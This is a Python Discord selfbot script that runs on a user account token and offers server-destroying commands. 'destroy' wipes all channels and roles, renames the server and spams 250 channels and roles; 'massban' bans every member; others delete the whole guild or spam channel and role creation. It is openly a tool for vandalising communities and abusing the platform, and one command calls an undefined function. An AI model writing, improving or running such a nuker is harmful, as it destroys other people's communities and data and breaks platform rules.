import discord, os, json, time

from discord.ext import commands

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')

bot = commands.Bot(description='Selfbot', command_prefix=prefix, self_bot=True)
bot.remove_command('help')

@bot.event
async def on_connect():
    print(f'''             
    Connected and Ready for use!
    User: {bot.user.name},
    Prefix: {prefix}
    ''')

@bot.event
async def on_message_edit(before, after):
    await bot.process_commands(after)

@bot.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@bot.command()
async def cls(ctx):
    os.system("cls")
    await ctx.message.edit(content='done.')
    print(f'''             
    Connected and Ready for use!
    User: {bot.user.name},
    Prefix: {prefix}
    ''')

@bot.command()
async def destroy(ctx):
    await ctx.message.delete()
    x = input('New server name: ')
    x2 = input('New text channels name: ')
    x3 = input('New roles name: ')
    print(f'Changed Discord Server Name to: {x}, Creating channels with the name: {x2}, Creating roles with the name: {x3}')
    print('Destroyed:', ctx.guild.name)
    for channel in list(ctx.guild.channels):
        try:
            time.sleep(1)
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            time.sleep(1)
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name= x,
            description="Destroyed",
            reason="why not.",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        time.sleep(1)
        await ctx.guild.create_text_channel(name=x2)
    for _i in range(250):
        time.sleep(1)
        await ctx.guild.create_role(name=x3)

@bot.command()
async def massban(ctx):
    await ctx.message.delete()
    print('Mass banning in:', ctx.guild.name)
    users = list(ctx.guild.members)
    for user in users:
        try:
            time.sleep(1)
            await user.ban(reason="destroy.")
        except:
            pass

@bot.command()
async def delete(ctx):
    await ctx.message.delete()
    reply = str(input(f'would you like to delete {ctx.guild.name} (y/n): ')).lower().strip()
    if reply[0] == 'y':
        await ctx.guild.delete()
        print(f'Deleted {ctx.guild.name}')
        return True
    if reply[0] == 'n':
        print(f'Didn\'t delete {ctx.guild.name}')
        return False
    else:
        return yes_or_no("Uhhhh... please enter ")

@bot.command()
async def spamchannels(ctx):
    await ctx.message.delete()
    x = input('Name of channels to spam?: ')
    print('Spamming channel creation in:', ctx.guild.name,'with the name:', x)
    for _i in range(250):
        try:
            time.sleep(1)
            await ctx.guild.create_text_channel(name= x)
        except:
            return

@bot.command()
async def spamroles(ctx):
    await ctx.message.delete()
    x = input('Name of roles to spam?: ')
    print('Spamming role creation in:', ctx.guild.name,'with the name:', x)
    for _i in range(250):
        try:
            time.sleep(1)
            await ctx.guild.create_role(name= x)
        except:
            return

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    print('Deleteing channels in:', ctx.guild.name)
    for channel in list(ctx.guild.channels):
        try:
            time.sleep(1)
            await channel.delete()
        except:
            return

@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    print('Deleteing roles in:', ctx.guild.name)
    for role in list(ctx.guild.roles):
        try:
            time.sleep(1)
            await role.delete()
        except:
            pass

bot.run(token, bot=False)